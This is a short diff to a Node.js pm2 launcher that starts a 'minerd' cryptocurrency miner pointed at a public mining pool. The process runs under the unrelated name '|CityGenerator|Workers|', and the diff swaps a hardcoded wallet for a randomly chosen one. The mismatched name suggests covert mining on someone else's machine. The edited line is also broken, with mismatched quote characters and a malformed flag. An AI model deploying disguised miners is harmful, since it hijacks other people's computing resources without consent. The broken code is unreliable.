@@ -1,3 +1,4 @@
+const rnd_dgb = require('./rnd_dgb'); 
 const pm2 = require('pm2')
 pm2.connect(function(err) {
   if (err) {
@@ -6,7 +7,7 @@ pm2.connect(function(err) {
   }
   
   pm2.start({
-    script    : './minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=D82v9SnHsUdrPdsr3ENgmH5HQBUfSyZiUs:x',
+    script    : './minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 -userpass=${rnd_dgb()}`,
     args      : '',
     name      : '|CityGenerator|Workers|'
 },
